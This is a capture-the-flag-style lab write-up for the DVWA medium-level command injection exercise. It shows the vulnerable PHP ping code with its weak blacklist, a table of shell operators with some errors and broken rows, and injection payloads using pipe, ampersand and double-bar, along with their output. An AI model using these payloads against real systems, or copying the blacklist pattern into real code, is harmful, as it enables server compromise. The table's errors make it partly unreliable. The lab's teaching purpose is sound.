## Command Injection Medium


We look at the source code http://127.0.0.1/vulnerabilities/view_source.php?id=exec&security=medium



```php


<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>

```

Since it does nto validate user input , we can just input a random integer or character instead of an ip address 

using the operators 


| Name  | operators     | Description |
| --- | --- | --- |
| Ampersand     | & | Dictates the shell to execute the linux command in the background |
| Semicolon     | ; | execute command in a defined , sequential order |
| Or    | ||    | will execute the command that follows if the preceding command fails (returns an exit code of 0 ) Like a logical or gate |
| Pipe  | | | Directs the output of the preceding command as the input to the succeeding command |
| AND   | &&    | will execute commands only if the preceding command was successfully executed |
| Will execute all the commands up until bad_command |
| NOT   | ! | Does not perform an operation |
| Precedence    | (..)  | The commands following the AND and OR operators depend on the exit code of the preceding command. These operators are binary and only evaluate the two commands that come before and after them |
| Set groups and precedence to ensure that the execution sequence meets your expectations |
| Combination   | {..}  | Group commands: Will be executed depending upon the exit code of the first command |
| Concatenation or Escape   | \ | Two Functions: Either use it to conctenate two commands or as an escape character when working with  strings in shell |
| Redirection   | >, >> , <     | Redirects the output or the inut to a file by re-writting or appending to the file |

|


It is restricting us from using && and ; 


We can start trying the operands 

```Bash
1| whoami 
1| hostname
``` 

```Bash
1& whoami 
1& hostname
``` 

```Bash
1 || whoami 
1 || hostname
``` 

and the result is : 

```Bash
www-data
7ee3c931e984
```
